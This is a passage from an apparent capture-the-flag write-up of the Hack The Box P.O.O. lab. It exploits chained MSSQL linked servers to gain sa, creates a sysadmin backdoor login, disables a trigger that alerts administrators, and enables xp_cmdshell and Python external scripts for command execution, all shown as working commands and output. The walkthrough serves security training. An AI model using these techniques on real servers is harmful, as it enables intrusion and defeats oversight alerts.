</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 1: Changed language setting to us_english.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 88<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; 
</span></span></code></pre></div><p>I can perform basic server enumeration to gather information such as the MSSQL version, user accounts, and admin users:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; <span class="k">select</span> @@version<span class="p">;</span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                            
</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
</span></span><span class="line"><span class="cl">Microsoft SQL Server <span class="m">2017</span> <span class="o">(</span>RTM-GDR<span class="o">)</span> <span class="o">(</span>KB5040942<span class="o">)</span> - 14.0.2056.2 <span class="o">(</span>X64<span class="o">)</span> 
</span></span><span class="line"><span class="cl">        Jun <span class="m">20</span> <span class="m">2024</span> 11:02:32 
</span></span><span class="line"><span class="cl">        Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2017</span> Microsoft Corporation
</span></span><span class="line"><span class="cl">        Standard Edition <span class="o">(</span>64-bit<span class="o">)</span> on Windows Server <span class="m">2019</span> Standard 10.0 &lt;X64&gt; <span class="o">(</span>Build 17763: <span class="o">)</span> <span class="o">(</span>Hypervisor<span class="o">)</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; <span class="k">select</span> name FROM master..syslogins
</span></span><span class="line"><span class="cl">name            
</span></span><span class="line"><span class="cl">-------------   
</span></span><span class="line"><span class="cl">sa              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">external_user   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; <span class="k">select</span> name FROM master..syslogins WHERE <span class="nv">sysadmin</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">name   
</span></span><span class="line"><span class="cl">----   
</span></span><span class="line"><span class="cl">sa   
</span></span></code></pre></div><p>Although we have found two users, there is one other user, the <code>admin</code> . I can enumerate my privileges to see what activities I can do on the server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt;  SELECT entity_name, permission_name FROM fn_my_permissions<span class="o">(</span>NULL, <span class="s1">&#39;SERVER&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">entity_name   permission_name   
</span></span><span class="line"><span class="cl">-----------   ---------------   
</span></span><span class="line"><span class="cl">server        CONNECT SQL    
</span></span></code></pre></div><p>I can list the databases and find the current one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; SELECT name FROM master..sysdatabases<span class="p">;</span>
</span></span><span class="line"><span class="cl">name         
</span></span><span class="line"><span class="cl">----------   
</span></span><span class="line"><span class="cl">master       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tempdb       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POO_PUBLIC   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL&gt; SELECT DB_NAME<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">------------------------------
</span></span><span class="line"><span class="cl">master  
</span></span></code></pre></div><p>I explored the different tables and their columns, but didn’t come across anything significant worth sharing.</p>

<h2 class="relative group"><strong>Linked Servers</strong>
    <div id="linked-servers" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#linked-servers" aria-label="Anchor">#</a>
    </span>
    
</h2>

<h3 class="relative group">Enumeration
    <div id="enumeration-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration-1" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p><a
  href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/"
    target="_blank"
  >This article</a> provides a useful guide on how to exploit SQL Server links. An SQL Server link allows an MSSQL server to connect to external data sources, including other MSSQL servers, Oracle databases, Excel workbooks, and more. The link specifies which resources are accessed and under which user account. If not properly configured, this can be exploited.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; <span class="k">select</span> @@servername
</span></span><span class="line"><span class="cl">                           
</span></span><span class="line"><span class="cl">------------------------   
</span></span><span class="line"><span class="cl">COMPATIBILITY<span class="se">\P</span>OO_PUBLIC  
</span></span></code></pre></div><p>To check for linked servers, I’ll query the <code>sysservers</code> table (the article recommends <code>*</code>, but I’ll just show the name for readability):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; <span class="k">select</span> srvname from sysservers<span class="p">;</span>
</span></span><span class="line"><span class="cl">srvname                    
</span></span><span class="line"><span class="cl">------------------------   
</span></span><span class="line"><span class="cl">COMPATIBILITY<span class="se">\P</span>OO_CONFIG   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COMPATIBILITY<span class="se">\P</span>OO_PUBLIC  
</span></span></code></pre></div><p>There is another linked remote server, POO_CONFIG.</p>
<p><strong>POO_CONFIG</strong></p>
<p>I found <code>EXECUTE</code>,  to be much more successful, however, from the article <code>openquery</code> is used to run queries on other servers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;select @@servername;&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                           
</span></span><span class="line"><span class="cl">------------------------   
</span></span><span class="line"><span class="cl">COMPATIBILITY<span class="se">\P</span>OO_CONFIG  
</span></span></code></pre></div><p>The link is set up to execute commands as the <code>internal_user</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;select suser_name();&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">-------------   
</span></span><span class="line"><span class="cl">internal_user  
</span></span></code></pre></div><p>The user we found is not an admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;select name FROM master..syslogins WHERE sysadmin = &#39;&#39;1&#39;&#39;;&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">name   
</span></span><span class="line"><span class="cl">----   
</span></span><span class="line"><span class="cl">sa     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#39;&#39;SERVER&#39;&#39;);&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">entity_name   permission_name   
</span></span><span class="line"><span class="cl">-----------   ---------------   
</span></span><span class="line"><span class="cl">server        CONNECT SQL    
</span></span></code></pre></div><p>looking at the data in the tables, I found nothing of interest.</p>
<p>I tried to have POO_CONFIG run a command on POO_PUBLIC and it works as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt;  EXEC <span class="o">(</span><span class="s1">&#39;EXEC (&#39;&#39;select suser_name();&#39;&#39;) at [COMPATIBILITY\POO_PUBLIC]&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">--   
</span></span><span class="line"><span class="cl">sa  
</span></span></code></pre></div><p>Not only did it succeed, but that command is now being executed as the <code>sa</code> user! This misconfiguration occurs because when the two links between the databases were established, the first link allows any user on <code>POO_PUBLIC</code> to run queries (i.e., commands) on <code>POO_CONFIG</code> as <code>internal_user</code>. The second link must have been configured so that any user on <code>POO_CONFIG</code> can run queries on <code>POO_PUBLIC</code> as <code>sa</code>. This second link may have seemed reasonable to an administrator at the time, as only trusted individuals would have access to the internal <code>POO_PUBLIC</code>. It&rsquo;s easy to overlook the other link.</p>
<p>Now, when I check my permissions locally on <code>POO_CONFIG</code> with the current user, I find that I have almost no privileges:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#39;&#39;SERVER&#39;&#39;);&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span>
</span></span><span class="line"><span class="cl">entity_name   permission_name   
</span></span><span class="line"><span class="cl">-----------   ---------------   
</span></span><span class="line"><span class="cl">server        CONNECT SQL  
</span></span></code></pre></div><p>However, when I ask POO_CONFIG to POO_PUBLIC, I’ve got all the permissions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE <span class="o">(</span><span class="s1">&#39;EXECUTE (&#39;&#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#39;&#39;&#39;&#39;SERVER&#39;&#39;&#39;&#39;);&#39;&#39;) at [COMPATIBILITY\POO_PUBLIC]&#39;</span><span class="o">)</span> at <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">entity_name   permission_name                   
</span></span><span class="line"><span class="cl">-----------   -------------------------------   
</span></span><span class="line"><span class="cl">server        CONNECT SQL                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        SHUTDOWN                          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE ENDPOINT                   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE ANY DATABASE               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE AVAILABILITY GROUP         
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY LOGIN                   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY CREDENTIAL              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY ENDPOINT                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY LINKED SERVER           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY CONNECTION              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY DATABASE                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER RESOURCES                   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER SETTINGS                    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER TRACE                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY AVAILABILITY GROUP      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ADMINISTER BULK OPERATIONS        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        AUTHENTICATE SERVER               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        EXTERNAL ACCESS ASSEMBLY          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        VIEW ANY DATABASE                 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        VIEW ANY DEFINITION               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        VIEW SERVER STATE                 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE DDL EVENT NOTIFICATION     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE TRACE EVENT NOTIFICATION   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY EVENT NOTIFICATION      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER SERVER STATE                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        UNSAFE ASSEMBLY                   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY SERVER AUDIT            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CREATE SERVER ROLE                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY SERVER ROLE             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        ALTER ANY EVENT SESSION           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CONNECT ANY DATABASE              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        IMPERSONATE ANY LOGIN             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        SELECT ALL USER SECURABLES        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">server        CONTROL SERVER                    
</span></span></code></pre></div><p>To make our work easier, I shall add another <code>sa</code> user to make our work easier rather than keep on bouncing everything every time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE<span class="o">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;CREATE LOGIN df WITH PASSWORD = &#39;&#39;&#39;&#39;victor_n00b&#39;&#39;&#39;&#39;;&#39;&#39;) AT [COMPATIBILITY\POO_PUBLIC]&#39;</span><span class="o">)</span> AT <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span>
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user  external_user@master<span class="o">)</span>&gt; EXECUTE<span class="o">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;EXEC sp_addsrvrolemember &#39;&#39;&#39;&#39;df&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39;&#39;&#39;) AT [COMPATIBILITY\POO_PUBLIC]&#39;</span><span class="o">)</span> AT <span class="o">[</span>COMPATIBILITY<span class="se">\P</span>OO_CONFIG<span class="o">]</span>
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>external_user 
</span></span></code></pre></div><p>Lets try to connect to the server with our new admin account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿v1c70r<span class="o">)</span>-<span class="o">[</span>/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py df:victor_n00b@10.13.38.11
</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 1: Changed language setting to us_english.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 88<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt;
</span></span></code></pre></div><p>we are in, lets get our DB flag now. As the new <code>sa</code> user,  I can now access another database <code>flag</code>  and to query a  I can now access another database in MSSQL, the syntax is <code>[server].[db].[schema].[table]</code>. Therefore, I can retrieve the flag using the following command as shown below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; SELECT name FROM master..sysdatabases<span class="p">;</span>
</span></span><span class="line"><span class="cl">name         
</span></span><span class="line"><span class="cl">----------   
</span></span><span class="line"><span class="cl">master       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tempdb       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">model        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msdb         
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POO_PUBLIC   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flag         
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; <span class="k">select</span> table_schema from flag.INFORMATION_SCHEMA.TABLES<span class="p">;</span>
</span></span><span class="line"><span class="cl">table_schema   
</span></span><span class="line"><span class="cl">------------   
</span></span><span class="line"><span class="cl">dbo            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; <span class="k">select</span> * from flag.dbo.flag
</span></span><span class="line"><span class="cl">flag                                       
</span></span><span class="line"><span class="cl">----------------------------------------   
</span></span><span class="line"><span class="cl">b<span class="s1">&#39;POO{[REDACTED]}&#39;</span>   
</span></span></code></pre></div>
<h1 class="relative group">BackTrack
    <div id="backtrack" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#backtrack" aria-label="Anchor">#</a>
    </span>
    
</h1>
<p>Now that I’m sa on the database, I want to get a shell on the host. I’ll try <code>xp_cmdshell</code>, but it fails.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; xp_cmdshell whoami
</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">&#39;sys.xp_cmdshell&#39;</span> of component <span class="s1">&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the security configuration <span class="k">for</span> this server. A system administrator can <span class="nb">enable</span> the use of <span class="s1">&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span class="s1">&#39;xp_cmdshell&#39;</span>, search <span class="k">for</span> <span class="s1">&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
</span></span></code></pre></div><p>it could be the command is disabled, lets try to enable it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; enable_xp_cmdshell
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 11: Attempt to <span class="nb">enable</span> xp_cmdshell detected. Database Administrators will be notified!
</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 181: The transaction ended in the trigger. The batch has been aborted.
</span></span></code></pre></div><p>Trying the manual way, I still got the same error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; sp_configure <span class="s1">&#39;show advanced options&#39;</span>, <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">1</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; reconfigure
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 11: Attempt to <span class="nb">enable</span> xp_cmdshell detected. Database Administrators will be notified!
</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 181: The transaction ended in the trigger. The batch has been aborted.
</span></span></code></pre></div><p>These triggers serve as a policy designed to alert and prevent attempts to enable and use <code>xp_cmdshell</code>. The issue is that, as the <code>sa</code> user, I have the ability to <a
  href="https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/"
    target="_blank"
  >disable these triggers</a>. Triggers can be found in <code>sys.server_triggers</code> :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; <span class="k">select</span> name from sys.server_triggers<span class="p">;</span>
</span></span><span class="line"><span class="cl">name                
</span></span><span class="line"><span class="cl">-----------------   
</span></span><span class="line"><span class="cl">ALERT_xp_cmdshell  
</span></span></code></pre></div><p>I just need the <a
  href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/#triggerremoval"
    target="_blank"
  >syntax to disable it</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; disable trigger ALERT_xp_cmdshell on all server
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; 
</span></span></code></pre></div><p>with that, we can now enable <code>xp_cmdhsell</code> and it worked as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; enable_xp_cmdshell
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">1</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;xp_cmdshell&#39;</span> changed from <span class="m">1</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; xp_cmdshell whoami
</span></span><span class="line"><span class="cl">output                        
</span></span><span class="line"><span class="cl">---------------------------   
</span></span><span class="line"><span class="cl">nt service<span class="se">\m</span>ssql<span class="nv">$poo_public</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL                          
</span></span></code></pre></div>
<h2 class="relative group">Privilege escalation
    <div id="privilege-escalation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p><code>mssql$poo_public</code> has limited access. While there is a home directory, it is empty. The user has some access to the web directory, but the most notable file, <code>\inetput\wwwroot\web.config</code>, returns an access denied error:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; xp_cmdshell <span class="nb">type</span> C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config
</span></span><span class="line"><span class="cl">output              
</span></span><span class="line"><span class="cl">-----------------   
</span></span><span class="line"><span class="cl">Access is denied.   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NULL  
</span></span></code></pre></div><p>It appears that when a web server is configured to run the stored procedure <code>sp_execute_external_script</code> under a different user account, it allows for certain operations. The syntax for executing the script is <a
  href="https://nielsberglund.com/2017/04/20/sql-server-2017---python-executing-inside-sql-server/"
    target="_blank"
  >quite straightforward</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>df  dbo@master<span class="o">)</span>&gt; EXEC sp_execute_external_script @language <span class="o">=</span>N<span class="s1">&#39;Python&#39;</span>, @script <span class="o">=</span> N<span class="s1">&#39;import os; os.system(&#34;whoami&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>COMPATIBILITY<span class="se">\P</span>OO_PUBLIC<span class="o">)</span>: Line 0: STDOUT message<span class="o">(</span>s<span class="o">)</span> from external script: 
</span></span><span class="line"><span class="cl">compatibility<span class="se">\p</span>oo_public01
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Express Edition will <span class="k">continue</span> to be enforced.
</span></span></code></pre></div><p>Now we can run as <code>poo_public01</code>. Lets try to read the <code>web.config</code> file to see if we can find anything of interest to us.</p>
